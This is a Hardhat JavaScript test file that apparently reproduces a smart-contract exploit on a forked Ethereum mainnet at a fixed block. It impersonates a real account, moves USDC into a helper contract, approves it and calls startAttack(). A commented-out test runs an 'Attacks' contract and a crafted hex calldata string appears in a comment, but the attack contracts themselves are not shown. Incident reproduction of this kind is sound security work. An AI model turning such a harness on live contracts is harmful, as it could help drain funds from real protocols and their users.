const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const blockNumber = 15873419;

// describe("attack", function () {
//   it(`should be block number: ${blockNumber}`, async () => {
//     const _blockNumber = await ethers.provider.getBlockNumber();
//     console.log("_blockNumber", _blockNumber);
//     expect(_blockNumber).to.equal(blockNumber);
//   });
//   it("attacks", async function () {
//     const Attacks = await ethers.getContractFactory("Attacks");
//     const attacks = await Attacks.deploy();
//     console.log(attacks);

//     await attacks.attacks();

//     console.log("attacks finsh");

//     await attacks.swapInETH();
//   });
// });

describe("getbalance", function () {
  it("getbalance", async function () {
    const Utils = await ethers.getContractFactory("utils");
    const utils = await Utils.deploy();
    console.log(Utils);

    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0x5B5A922E065A425eE7e9b70185ba563Ef270afCD"],
    });

    const signer = await ethers.provider.getSigner(
      "0x5B5A922E065A425eE7e9b70185ba563Ef270afCD"
    );

    await utils.getbalance(signer._address);

    utils
      .connect(signer)
      .attach("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48")
      .transfer(utils.address, 10000);

    await utils.getbalance(utils.address);

    console.log(
      "utils balance:%s",
      await ethers.utils.formatEther(
        await ethers.provider.getBalance(utils.address)
      )
    );

    await utils.approveUSDC();

    // const data =
    //   "0x8e031cb6000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000000000000025aDf743c0Fa773B4a37535eE653092822D01d9A00000000000000000000000000000000000000000000000000000000436d8150";

    await utils.startAttack();
  });
});
